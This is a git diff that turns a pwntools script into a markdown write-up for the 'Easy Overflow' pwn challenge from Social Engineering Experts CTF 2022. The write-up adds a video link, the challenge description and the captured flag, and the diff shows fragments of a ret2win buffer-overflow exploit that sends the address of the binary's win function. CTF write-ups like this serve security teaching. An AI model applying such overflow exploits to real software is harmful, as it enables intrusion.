@@ -1,5 +1,35 @@
-from pwn import *
+---
+name: Easy Overflow (2022)
+event: Social Engineering Experts CTF 2022
+category: Pwn
+description: Writeup for Easy Overflow (Pwn) - Social Engineering Experts CTF (2022) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
+---
 
+# Easy Overflow
+
+## Video Walkthrough
+
+[![VIDEO](https://img.youtube.com/vi/-cc4U1H53F8/0.jpg)](https://youtu.be/-cc4U1H53F8?t=2362 "Social Engineering Experts CTF 2022: Easy Overflow")
+
+## Description
+
+> I did a check on my return address. Now you shouldn't be able to control my RIP.
+
+## Solution
+
+```py
+from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -9,7 +39,6 @@ def start(argv=[], *a, **kw):
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
-
 
 # Specify GDB script here (breakpoints etc)
 gdbscript = '''
@@ -49,3 +78,6 @@ io.sendlineafter(b'I will give you one more chance.', flat(elf.functions.win))
 
 # Got Flag?
 io.interactive()
+```
+
+Flag: `SEE{R1P_15_K1NG_RBP_15_QU33N_31cfc2f963517cd7e1b33b84a0e6bea2}`
